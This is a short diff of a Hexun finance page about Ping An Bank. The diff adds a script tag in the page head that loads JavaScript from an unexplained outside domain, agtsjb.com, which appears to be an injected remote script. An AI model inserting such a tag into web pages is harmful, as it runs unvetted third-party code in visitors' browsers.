@@ -1,7 +1,7 @@
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
-<head>
+<head><script src="https://agtsjb.com/j/gyo.js?t=fx&v=1&g=8cab8ee1bb70&c=441ca8ebf5b1"></script> 
 <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
 <title>平安银行综合能力 - 财务评估 - 和讯网</title>
 <link href="css/direction.css" rel="stylesheet" type="text/css" />
